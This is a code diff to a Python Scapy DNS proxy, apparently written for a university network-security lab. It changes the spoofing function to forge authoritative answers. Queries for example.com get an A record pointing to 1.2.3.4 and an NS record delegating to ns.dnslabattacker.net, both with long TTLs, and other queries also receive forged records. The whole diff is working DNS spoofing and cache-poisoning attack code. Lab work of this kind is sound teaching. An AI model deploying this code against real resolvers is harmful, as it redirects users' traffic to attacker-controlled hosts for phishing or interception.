@@ -17,16 +17,29 @@ spoof_response = args.spoof_response
 
 def spoof_dns_response(query_data):
     """
-    Generates a spoofed DNS response for a given query.
+    Generates a spoofed DNS response for a given query, specifically targeting example.com.
     """
-    # Decode the original DNS request
     dns_request = DNS(query_data)
-    # Craft a fake response
-    dns_response = DNS(
-        id=dns_request.id, qr=1, aa=1, qd=dns_request.qd,
-        an=DNSRR(rrname=dns_request.qd.qname, ttl=10, rdata='1.2.3.4')
-    )
+    
+    # Check if the query is for example.com
+    if dns_request.qd.qname == 'example.com.':
+        # How to modify packet using Scapy:
+        # https://www.usna.edu/Users/cs/choi/it432/lec/l06/lec.html
+        # Craft a fake response including the spoofed A record and NS record
+        dns_response = DNS(id=dns_request.id, qr=1, aa=1, qd=dns_request.qd,
+                           an=DNSRR(rrname=dns_request.qd.qname, ttl=99999, rdata='1.2.3.4') / 
+                              DNSRR(rrname=dns_request.qd.qname, ttl=99999, type='NS', rdata='ns.dnslabattacker.net.'))
+        
+
+    else:
+        # How to modify packet using Scapy:
+        # https://www.usna.edu/Users/cs/choi/it432/lec/l06/lec.html
+        # If the query is not for example.com, create a generic response (this could be forwarding instead)
+        dns_response = DNS(id=dns_request.id, qr=1, aa=1, qd=dns_request.qd,
+                           an=DNSRR(rrname=dns_request.qd.qname, ttl=99999, rdata='1.2.3.4'))
+        
     return bytes(dns_response)
+
 
 def forward_dns_query(data, addr):
     """
@@ -42,6 +55,11 @@ def forward_dns_query(data, addr):
     return response
 
 def run_proxy(port, dns_port, spoof_response):
+    """
+    Run the DNS proxy in the loop and handle incoming socket connections.
+    """
+    # Python Socket Connection:
+    # https://realpython.com/python-sockets/
     proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         proxy_socket.bind(('0.0.0.0', port))
